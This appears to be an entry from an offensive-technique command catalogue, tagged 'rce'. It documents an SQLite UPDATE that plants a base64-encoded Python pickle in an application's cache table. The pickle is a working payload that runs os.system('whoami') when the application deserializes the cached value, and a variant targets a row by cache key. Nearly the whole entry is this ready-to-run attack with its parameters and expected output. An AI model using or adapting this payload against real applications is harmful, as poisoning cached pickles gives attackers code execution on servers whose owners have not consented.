---
data: >-
  UPDATE my_cache_table SET value =
  'gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=' WHERE rowid=2;
tags:
  - update
  - payload
  - rce
type: command
output: 'Confirmation of update (e.g., 1 row affected)'
executor: sql
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:24.641Z'
id: 2c8c8d16-f6f8-4ebe-bd4e-eaf17b6bd5d9
verified: false
validated: true
submitted: true
---
# sqlite3-update-payload

## Command

```sql
UPDATE my_cache_table SET value = 'gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=' WHERE rowid=2;
```

## Description

Updates a specific cache row's value with base64-encoded malicious pickled data for RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| value | Column to set with pickled payload | Yes |
| 'gASVHg...' | Base64 of pickled Pwner class for os.system('whoami') | Yes |
| rowid=2 | Target row identifier | Yes |
| my_cache_table | Cache table name | Yes |

## Examples

### Basic Usage

```sql
UPDATE my_cache_table SET value = 'gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=' WHERE rowid=2;
```

### Advanced Usage

```sql
UPDATE my_cache_table SET value = 'MALICIOUS_BASE64' WHERE cache_key = 'specific_key';
```

> Targets by key instead of rowid.

## Expected Output

1 row affected.

## Related

- [[Related Procedure]]
